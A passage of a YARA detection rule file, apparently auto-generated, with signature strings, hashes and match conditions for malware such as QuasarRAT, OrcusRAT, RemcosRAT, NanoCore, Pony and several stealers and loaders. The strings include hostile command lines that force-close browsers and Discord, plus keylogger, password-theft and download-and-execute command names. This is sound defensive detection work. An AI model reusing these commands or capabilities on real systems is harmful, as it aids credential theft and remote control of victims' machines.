      $s9 = "VCRUNTIME140.dll" fullword wide /* score: '26.00'*/
      $s10 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '24.00'*/
      $s11 = "bapi-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s12 = "bucrtbase.dll" fullword ascii /* score: '23.00'*/
      $s13 = "bapi-ms-win-crt-runtime-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s14 = "5python39.dll" fullword ascii /* score: '23.00'*/
      $s15 = "bapi-ms-win-core-errorhandling-l1-1-0.dll" fullword ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 27000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _MystRodX_signature__MystRodX_signature__587baefa_MystRodX_signature__c30fe320_3 {
   meta:
      description = "_subset_batch - from files MystRodX(signature).elf, MystRodX(signature)_587baefa.elf, MystRodX(signature)_c30fe320.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "723c1e59accbb781856a8407f1e64f36038e324d3f0bdb606d35c359ade08200"
      hash2 = "587baefa189b1ea2cf0412e6f5a4bb7c103785ba838232b4905f52d77f41cda0"
      hash3 = "c30fe320fc301a50b8834fb842d95db273944a6f57af55c864fb3f59640f4cc0"
   strings:
      $s1 = "DHIRCLK" fullword ascii /* score: '11.50'*/
      $s2 = "Z4');/ -'j:\"09DBn2Q" fullword ascii /* score: '11.00'*/
      $s3 = "C(*>(/#>+kf(x:\"pS4+!+ &14|5" fullword ascii /* score: '11.00'*/
      $s4 = "Xenli.clk" fullword ascii /* score: '10.00'*/
      $s5 = "GKJkl5dl.2 >6>n)6/x:\"p^4-s:9 13(;" fullword ascii /* score: '10.00'*/
      $s6 = "GCGIMBINKC" fullword ascii /* score: '9.50'*/
      $s7 = "QXFTP\\" fullword ascii /* score: '9.00'*/
      $s8 = "6*,)&b\"#" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s9 = "))-3-.+#;831" fullword ascii /* score: '9.00'*/ /* hex encoded string '81' */
      $s10 = "nckIRCVY" fullword ascii /* score: '9.00'*/
      $s11 = "ONLIrCLK" fullword ascii /* score: '9.00'*/
      $s12 = "RP#aliRclk" fullword ascii /* score: '9.00'*/
      $s13 = "^ZTP\\Tcjligclkiimbllog9xsqp" fullword ascii /* score: '9.00'*/
      $s14 = "wo,lhueyeg`gcz" fullword ascii /* score: '9.00'*/
      $s15 = ":EJLIRCLK" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _O__Loader_signature__efd455830ba918de67076b7c65d86586_imphash__O__Loader_signature__efd455830ba918de67076b7c65d86586_imphas_4 {
   meta:
      description = "_subset_batch - from files O--Loader(signature)_efd455830ba918de67076b7c65d86586(imphash).exe, O--Loader(signature)_efd455830ba918de67076b7c65d86586(imphash)_c5c67e95.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5f4bd5cbfbc2b96e96b7752d4595d545d4d073a0ed9c3ccab16abb4bad06cafa"
      hash2 = "c5c67e953b73276d2db8f2dc9cba8b40a2fa221337862cea35436329086a1ca6"
   strings:
      $s1 = "OnExecuteH" fullword ascii /* score: '18.00'*/
      $s2 = "SystemtfH" fullword ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s3 = "Shared.CommonFunc" fullword ascii /* score: '17.00'*/
      $s4 = "SystemP0G" fullword ascii /* score: '14.00'*/
      $s5 = "PExtendedd" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s6 = ":Shared.CommonFunc" fullword ascii /* score: '14.00'*/
      $s7 = "TPropSet<System.Comp><=C" fullword ascii /* score: '14.00'*/
      $s8 = "Shared.SetupEntFunc\"Compression.LZMA1SmallDecompressor" fullword ascii /* score: '13.00'*/
      $s9 = "GNo single cast observer with ID %d was added to the observer collectionFNo multi cast observer with ID %d was added to the obse" wide /* score: '13.00'*/
      $s10 = ".TList<System.Rtti.TRttiManagedField>.ParrayofTp" fullword ascii /* score: '12.00'*/
      $s11 = "PasswordTest" fullword ascii /* score: '12.00'*/
      $s12 = "lzma1smalldecompressor: Compressed data is corrupted (%d)" fullword wide /* score: '12.00'*/
      $s13 = "Property '%s' is write-only=RTTI objects cannot be manually destroyed by application code\"%s (Version %d.%d, Build %d, %5:s):%s" wide /* score: '11.50'*/
      $s14 = "ITDictionary<System.string,System.Classes.TPersistentClass>.TKeyEnumerator," fullword ascii /* score: '11.00'*/
      $s15 = "HTDictionary<System.Integer,System.Classes.IInterfaceList>.TKeyEnumerator," fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "efd455830ba918de67076b7c65d86586" and ( 8 of them )
      ) or ( all of them )
}

rule _PhantomStealer_signature__c683e3b27c71664aa97638c9ad41bc57_imphash__QuirkyLoader_signature__8f6147358a3cb4574c523add38b550d_5 {
   meta:
      description = "_subset_batch - from files PhantomStealer(signature)_c683e3b27c71664aa97638c9ad41bc57(imphash).exe, QuirkyLoader(signature)_8f6147358a3cb4574c523add38b550de(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "167ff01b07259dbeeeee93d62e0836b60c51b8dfdc7898d507a25ab33acf4b60"
      hash2 = "a20e4dfb7eea3d41c5fd09918460fdfb83261bf7a22be1fe3d29a39faf9415ef"
   strings:
      $x1 = "NSystem.Private.Reflection.Execution.dllBSystem.Private.StackTraceMetadata" fullword ascii /* score: '31.00'*/
      $x2 = "JSystem.Private.StackTraceMetadata.dll2System.Private.TypeLoader" fullword ascii /* score: '31.00'*/
      $x3 = "System.Linq.dllFSystem.Private.Reflection.Execution" fullword ascii /* score: '31.00'*/
      $s4 = "System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s5 = "The current thread attempted to reacquire a mutex that has reached its maximum acquire count" fullword wide /* score: '25.00'*/
      $s6 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s7 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s8 = "System.Collections.Generic.IEnumerable<System.Runtime.Loader.LibraryNameVariation>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s9 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s10 = "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '24.00'*/
      $s11 = "System.Collections.Generic.IEnumerator<System.Runtime.Loader.LibraryNameVariation>.get_Current@" fullword ascii /* score: '24.00'*/
      $s12 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s13 = "Format of the executable (.exe) or library (.dll) is invalid" fullword wide /* score: '24.00'*/
      $s14 = "icuuc.dll" fullword wide /* score: '23.00'*/
      $s15 = "icuin.dll" fullword wide /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _O__Loader_signature__efd455830ba918de67076b7c65d86586_imphash__O__Loader_signature__efd455830ba918de67076b7c65d86586_imphas_6 {
   meta:
      description = "_subset_batch - from files O--Loader(signature)_efd455830ba918de67076b7c65d86586(imphash).exe, O--Loader(signature)_efd455830ba918de67076b7c65d86586(imphash)_c5c67e95.exe, PureLogsStealer(signature)_40ab50289f7ef5fae60801f88d4541fc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5f4bd5cbfbc2b96e96b7752d4595d545d4d073a0ed9c3ccab16abb4bad06cafa"
      hash2 = "c5c67e953b73276d2db8f2dc9cba8b40a2fa221337862cea35436329086a1ca6"
      hash3 = "91136aef6d58268a60dbfba702338fada14dddb4d3523acf4dfad671c58780d9"
   strings:
      $x1 = "<file name=\"comctl32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x2 = "<file name=\"version.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x3 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $s4 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s5 = "<file name=\"netutils.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s6 = "<file name=\"mpr.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s7 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s8 = "FHeaderProcessed" fullword ascii /* score: '20.00'*/
      $s9 = "FExecuteAfterTimestamp" fullword ascii /* score: '18.00'*/
      $s10 = "For more detailed information, please visit https://jrsoftware.org/ishelp/index.php?topic=setupcmdline" fullword wide /* score: '18.00'*/
      $s11 = "TComponent.GetObservers$1$Intf" fullword ascii /* score: '15.00'*/
      $s12 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s13 = "TComponent.GetObservers$ActRec" fullword ascii /* score: '15.00'*/
      $s14 = "TComponent.GetObservers$0$Intf" fullword ascii /* score: '15.00'*/
      $s15 = "SetupMutex" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Pony_signature__d19a2a0f5397666cc38d9017aa09d5e7_imphash__Pony_signature__d19a2a0f5397666cc38d9017aa09d5e7_imphash__c0cb68c_7 {
   meta:
      description = "_subset_batch - from files Pony(signature)_d19a2a0f5397666cc38d9017aa09d5e7(imphash).exe, Pony(signature)_d19a2a0f5397666cc38d9017aa09d5e7(imphash)_c0cb68c9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d0c8596e72059a5c5e5421929f65efbebca319d1227fd2e1db89f9117ae7c55d"
      hash2 = "c0cb68c9404c00ab57d203c257621cbb77548c7ff6a322fa994f9e79b30f7cf8"
   strings:
      $s1 = "Error setting %s.Count8Listbox (%s) style must be virtual in order to set Count\"Unable to find a Table of Contents" fullword wide /* score: '17.00'*/
      $s2 = ">6>:>>>\\>`>d>" fullword ascii /* score: '9.00'*/ /* hex encoded string 'm' */
      $s3 = "6 6$6(666" fullword ascii /* score: '9.00'*/ /* hex encoded string 'fff' */
      $s4 = "ShowRowHeading<" fullword ascii /* score: '9.00'*/
      $s5 = "AllowEditHeaders" fullword ascii /* score: '9.00'*/
      $s6 = "AllowMoveRangeT" fullword ascii /* score: '9.00'*/
      $s7 = "PrintRowHeading" fullword ascii /* score: '9.00'*/
      $s8 = "ShowColHeading" fullword ascii /* score: '9.00'*/
      $s9 = "PrintColHeading" fullword ascii /* score: '9.00'*/
      $s10 = "LargeChangeT" fullword ascii /* score: '9.00'*/
      $s11 = "Copyright (c) 1995 Visual Components, Inc." fullword wide /* score: '9.00'*/
      $s12 = "TConversion4" fullword ascii /* score: '8.00'*/
      $s13 = "EVariantUnexpectedError8" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "d19a2a0f5397666cc38d9017aa09d5e7" and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6b67447d_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_8 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6b67447d.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_87688590.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9aa99c6f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b4cc1820.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d017447f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6b67447d97fcaca79ed98bcd6461b06445e978be3d45d4b0e2637057da97c4c2"
      hash2 = "8768859060387f56a2243b3d68d1b88fc12def261668c945d67ba7772f569b24"
      hash3 = "9aa99c6f7cab60192507282874b120aa0401f64a2a56c23ef23aa781a90e7c5f"
      hash4 = "b4cc18207df83ad7c5fee8b34d2f2e680ba7dc45e51002d62712034a4cef69c6"
      hash5 = "d017447f8ef2d707ce3a908e05bcac2206d8f5b8d63b72e494a81eb379b69853"
   strings:
      $x1 = "cmd.exe /c start %TARGETOSDRIVE%\\Recovery\\OEM\\" fullword wide /* score: '53.00'*/
      $x2 = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F" fullword wide /* score: '52.00'*/
      $x3 = "Conhost --headless cmd.exe /c taskkill /IM operagx.exe /F" fullword wide /* score: '52.00'*/
      $x4 = "Conhost --headless cmd.exe /c taskkill /IM " fullword wide /* score: '47.00'*/
      $x5 = "Conhost --headless cmd.exe /c taskkill /IM firefox.exe /F" fullword wide /* score: '47.00'*/
      $x6 = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F" fullword wide /* score: '47.00'*/
      $x7 = "Conhost --headless cmd.exe /c taskkill /IM msedge.exe /F" fullword wide /* score: '47.00'*/
      $x8 = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F" fullword wide /* score: '47.00'*/
      $x9 = "Conhost --headless cmd.exe /c taskkill /IM discord.exe /F" fullword wide /* score: '47.00'*/
      $x10 = "Conhost --headless cmd.exe /c start firefox --profile=\"" fullword wide /* score: '46.00'*/
      $x11 = "Conhost --headless cmd.exe /c start \"\" \"" fullword wide /* score: '46.00'*/
      $x12 = "costura.system.numerics.vectors.dll.compressed|4.1.4.0|System.Numerics.Vectors, Version=4.1.4.0, Culture=neutral, PublicKeyToken" ascii /* score: '44.00'*/
      $x13 = "costura.gma.system.mousekeyhook.dll.compressed|5.7.1.0|Gma.System.MouseKeyHook, Version=5.7.1.0, Culture=neutral, PublicKeyToken" ascii /* score: '44.00'*/
      $x14 = "costura.system.buffers.dll.compressed|4.0.3.0|System.Buffers, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51|" ascii /* score: '44.00'*/
      $x15 = "costura.system.runtime.compilerservices.unsafe.dll.compressed|6.0.3.0|System.Runtime.CompilerServices.Unsafe, Version=6.0.3.0, C" ascii /* score: '44.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _OrcusRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__OrcusRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9 {
   meta:
      description = "_subset_batch - from files OrcusRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, OrcusRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_eb8df076.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a2c9a9ebdf13c0c7994382cb7e01fe0374bf43253dd58f908f60be03177753a1"
      hash2 = "eb8df076a9c27ca87f349a751a3f74d8f121ec0e96da996942d02099510085ea"
   strings:
      $x1 = "Orcus.Commands.Passwords.Applications.JDownloader" fullword ascii /* score: '38.00'*/
      $x2 = "Orcus.Shared.Commands.LiveKeylogger" fullword ascii /* score: '35.00'*/
      $x3 = "Orcus.Shared.Commands.Keylogger" fullword ascii /* score: '35.00'*/
      $x4 = "TOrcus.Commands.Passwords.Utilities.RegistryKeyExtensions+<GetFormattedKeyValues>d__4" fullword ascii /* score: '35.00'*/
      $x5 = "Orcus.Commands.LiveKeylogger" fullword ascii /* score: '32.00'*/
      $s6 = "System.Collections.Generic.IEnumerable<Orcus.Shared.Commands.Password.RecoveredPassword>.GetEnumerator" fullword ascii /* score: '30.00'*/
      $s7 = "System.Collections.Generic.IEnumerator<Orcus.Shared.Commands.Password.RecoveredPassword>.get_Current" fullword ascii /* score: '30.00'*/
      $s8 = "System.Collections.Generic.IEnumerator<Orcus.Shared.Commands.Password.RecoveredPassword>.Current" fullword ascii /* score: '30.00'*/
      $s9 = "DownloadAndExecuteFromUrlCommand" fullword ascii /* score: '30.00'*/
      $s10 = "Orcus.Shared.Commands.Password" fullword ascii /* score: '30.00'*/
      $s11 = "DownloadAndExecuteCommand" fullword ascii /* score: '30.00'*/
      $s12 = "Orcus.Commands.Passwords.Applications.Opera" fullword ascii /* score: '28.00'*/
      $s13 = "Orcus.Shared.Commands.EventLog" fullword ascii /* score: '27.00'*/
      $s14 = "Orcus.Commands.Passwords" fullword ascii /* score: '27.00'*/
      $s15 = "Orcus.Commands.Passwords.Utilities" fullword ascii /* score: '27.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__RemcosRAT_signature__1b0285cc_10 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature).vbe, RemcosRAT(signature)_1b0285cc.vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "15bcb405d41e172a0affcfa7bc98d1d03e7b8d957091c49f90df6da5f52149cf"
      hash2 = "1b0285cc2a215633f7c08196afa0905a887404509751de204529c0b1ded2fdb6"
   strings:
      $s1 = "Fs0!W+Wc$R%GA%82Fo&l!T!8 /qAGsWTcycc~01!lG;!* /*~%0Z~T!8c+/WA%0TW *c~0;Z/;Z;ZZZ!ZT*Zc1,A,Xq;A!O/A8FZ2T{!822%0Z$+R!* ;*fRFXTZ!!XT" wide /* score: '16.00'*/
      $s2 = "Xl*f*ZqZA&0/;ssooFsX&R3Z!0Z ;Z!WZ20AlfX*;A03ls*;Tc;&%woos+s~b02T+W *Gwo!l,XowssT3Rf022XZ*TycyccG%wosw,oFA%3{l&*Z+AA&!O0T W Wc$%o" wide /* score: '16.00'*/
      $s3 = "R2{l!l!Fzv8q&F!qAw&0T8c W*,Rsswo$sl2R2TF0X~%0Z~0swso$wsZ03Rs$%RqW /WARssws~obG%3,AA0{l**2XFlF*ZT*FyZG*3*oXZ *Z20swsoTw,Z03Z*{&WT" wide /* score: '15.00'*/
      $s4 = "c+*&RAT0R%%$)~&T,Z1AG*lbyb +vW* y +sF&)/GZf892Oscw*0,OF8%q%T)ZZTvZ" fullword wide /* score: '12.00'*/
      $s5 = "oWb+*yXAwAXTz!b33WA)*zXyA/G2+2vG +fA8Aq2ycf)8bFW{%lZ ;+3,GF2%f%$qyF1!OTsOb3XF*G9/wG+Ay$Ov3WGyG + G/AAA3f2s9+A 2~1A8!%Z0" fullword wide /* score: '12.00'*/
      $s6 = "z&{~sZG*;!l{ARvX%Z*X$R  W{!Z,&20TFGc~%/2$0l*os~0&;fX3ls*TT+ f%wTO%0;Ay!Z2!OTAAb3 Fv9$2 !y/&Rb!O0" fullword wide /* score: '12.00'*/
      $s7 = "8cGTTZ!T!2TFZ{w&;s*A*~X!8c+cWA09A*G8TAA&%Ff*GZZW%q!{/2%{!R0FZv/fRv!)02F*G2T22fRF+*Gy!O3F;,9AR*3XF!!ZT!Z&!+/{sw WGTZ*0~ *G8T,A&0q" wide /* score: '12.00'*/
      $s8 = "l!*T*RF* ;*~%T8cycc~%woswbob2%3{l!*OXswssG9$bR2+*f&$0R +GZ+cyc{owF*TfW *GwoZ&*ycFssO*RoAR!qc8c+/F&%woswffz/02Z W *GooWFfGO0!8A{1" wide /* score: '12.00'*/
      $s9 = "+R2{*2XZ $A&Z,%Z W+cWA0swsoTw!,R3vl!*Z*0FW ;c$%TqW *c~0swso)w*c03F*T*OXwsowsG2*R2+X&2A0%y {Tyc W{swF*Zf* WGwsT&*+WGosOX%wA00ZcF*" wide /* score: '12.00'*/
      $s10 = "%AvX!l!*/8c ;*ARcFW+*c~%wsos)o2 02FX!l,XowssT3R&02+X2&$R%y G;FW+cFsoZyc+*FssOX%wA%RT0FW ;Gf%oowsT2yX%A!q*ycGooWFfGO0ZF$F,R!FW W*" wide /* score: '12.00'*/
      $s11 = "l!*Z*%8c ;*$%ZFW *c$0wsosOoFZ%3{l!*1Xwsos83~f0Avl&&~%R+ Fcqcyc{ow,*RoAR%!Wq* ;G2%osoo82qsR3!yc+*Fss*q2G1%Zq~G1R!yc WcO0swsoAw&*0" wide /* score: '12.00'*/
      $s12 = ";A /qW /c~0wsowGw2bR2Zqcyc{,R!qfFA%G/AR%f~0osws+s{!03O2$%+X*l&X/ZZ2f0;ZT!ZT8!0F%A!!ZFy/ZZc/&RAX9l*Z~02ls*;T*Z2%Z!T!TTA202Z+cyc{o" wide /* score: '12.00'*/
      $s13 = "*l*2*/!/32%/ZZT!Z Tql%2TT;!+ZOXO*9lslGZ~%~X2lZTc;&0TZ!!8Tv;%2Rq* WGwsT*1Xwsos~3&w%3fl!*/qW *cG0OF$A&Z,%;FW+cWA0swso/wvvR3&2ssZXT" wide /* score: '12.00'*/
      $s14 = "w%29/~%{*RT~2TZ!Zc!OAR3s;A0Fl*X$Z GZoA2sswo)s+*R2Ts$+GZ$%woswbool%2To~%oZ~0Z!TZcZ*%R2w/AR%+vFv/$2sswobw&GR3oZ~%Zs$ *qW /G~0swso)" wide /* score: '12.00'*/
      $s15 = "ZZqW *Fsw*F~2AX&;A0c8c/fRsswo wZ*R3T*A&W!9%TXZ!T W+cWv/Tyc **G%oswoysfl%Av*ZFG{,R!oAR%q*ycGwoGlsswo9slZR29Z$0+*f&F{c8f{$2%2$0WF*" wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0xfeff and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__074e6f0b_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_11 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_074e6f0b.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0ae8c502.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_21ea4b39.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5b14108c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_601331cb.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_650ca510.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67504a7c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_91638b5c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a6640f14.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_db728098.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "074e6f0bbab42ec220ce7c74545986d8ba1a641eb1f8690ad0d90063b0529844"
      hash2 = "0ae8c5022567fc8588fdc2fbf27d1d245f7e9bb15a23cb8a01962be6b51cb73c"
      hash3 = "21ea4b39f79a9af056ffc368cc9e78abbddec1838885b00a4d7eaeeb306d8515"
      hash4 = "5b14108c4f7e043dd7e9a0f9a3793608bf5690ae37b4e624a06d10bfbc6e61c1"
      hash5 = "601331cb72752cbcc12488cbd5a679325dd2d76696e87f7c3195cba348f3d215"
      hash6 = "650ca51048cf80b76d0450b73b41a1e12b81d8c0f3288fe67204a0be985e1693"
      hash7 = "67504a7c1e834ec7a871393547f566e8e0d40b5a1bf1d63b6676345266dea1e9"
      hash8 = "91638b5c9331d91c57a3b55363a7f5c76082d9261a8cfefc34fd3923dcf32dd5"
      hash9 = "a6640f14b119df661bb6d99d1e16a07a5d0f609c5d4ea3375ef3fa74bcab8d14"
      hash10 = "db728098ee83742156ca473750c72cc14ea5d249cb61a1168009eacbd880c1b3"
   strings:
      $s1 = "System.Collections.Generic.IEnumerable<Gma.System.MouseKeyHook.KeyPressEventArgsExt>.GetEnumerator" fullword ascii /* score: '22.00'*/
      $s2 = "System.Collections.Generic.IEnumerator<Gma.System.MouseKeyHook.KeyPressEventArgsExt>.get_Current" fullword ascii /* score: '22.00'*/
      $s3 = "Are you mixing protobuf-net and protobuf-csharp-port? See https://stackoverflow.com/q/11564914/23354; type: " fullword wide /* score: '20.00'*/
      $s4 = "<Execute>b__10_0" fullword ascii /* score: '18.00'*/
      $s5 = "Gma.System.MouseKeyHook.HotKeys" fullword ascii /* score: '17.00'*/
      $s6 = "System.Collections.Generic.IEnumerator<Gma.System.MouseKeyHook.KeyPressEventArgsExt>.Current" fullword ascii /* score: '17.00'*/
      $s7 = "Gma.System.MouseKeyHook.Implementation" fullword ascii /* score: '17.00'*/
      $s8 = "Gma.System.MouseKeyHook.WinApi" fullword ascii /* score: '17.00'*/
      $s9 = "; please see https://stackoverflow.com/q/14436606/23354" fullword wide /* score: '17.00'*/
      $s10 = "Invalid wire-type; this usually means you have over-written a file without truncating or setting the length; see https://stackov" wide /* score: '16.00'*/
      $s11 = "ProcessDragFinished" fullword ascii /* score: '15.00'*/
      $s12 = "ProcessDrag" fullword ascii /* score: '15.00'*/
      $s13 = "ProcessDragStarted" fullword ascii /* score: '15.00'*/
      $s14 = "get_TriggerKey" fullword ascii /* score: '12.00'*/
      $s15 = "get_RecoveredAccounts" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _NanoCore_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__NanoCore_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__12 {
   meta:
      description = "_subset_batch - from files NanoCore(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, NanoCore(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ee5c5ba4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aa4adbda7daad239a268c41c7735506d3fa7e65eceed44c72f4970696b68dbef"
      hash2 = "ee5c5ba42032ee6a64f4fe4e3bf490c96275a6e4f7f53299286357f5c0adbed9"
   strings:
      $s1 = "NanoCore Client.exe" fullword ascii /* score: '19.00'*/
      $s2 = "IClientUIHost" fullword ascii /* base64 encoded string*/ /* score: '19.00'*/
      $s3 = "ClientLoaderForm.resources" fullword ascii /* score: '16.00'*/
      $s4 = "IClientLoggingHost" fullword ascii /* score: '14.00'*/
      $s5 = "ClientLoaderForm" fullword ascii /* score: '13.00'*/
      $s6 = "NanoCore.ClientPluginHost" fullword ascii /* score: '12.00'*/
      $s7 = "PluginCommand" fullword ascii /* score: '12.00'*/
      $s8 = "GetBlockHash" fullword ascii /* score: '12.00'*/
      $s9 = "FileCommand" fullword ascii /* score: '12.00'*/
      $s10 = "PipeExists" fullword ascii /* score: '10.00'*/
      $s11 = "PipeCreated" fullword ascii /* score: '10.00'*/
      $s12 = "IClientNetworkHost" fullword ascii /* score: '9.00'*/
      $s13 = "#=qiY1B9yU2oVkPHxhn$y67SFTP8x1Jb0botGqdUGkdpQg=" fullword ascii /* score: '9.00'*/
      $s14 = "#=qPNzwB3EyeKwH$TwKjEdAjAC6A3IlGhANCdkUFCgvEiw=" fullword ascii /* score: '9.00'*/
      $s15 = "AddHostEntry" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 600KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6b67447d_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_13 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6b67447d.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9aa99c6f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b4cc1820.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d017447f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6b67447d97fcaca79ed98bcd6461b06445e978be3d45d4b0e2637057da97c4c2"
      hash2 = "9aa99c6f7cab60192507282874b120aa0401f64a2a56c23ef23aa781a90e7c5f"
      hash3 = "b4cc18207df83ad7c5fee8b34d2f2e680ba7dc45e51002d62712034a4cef69c6"
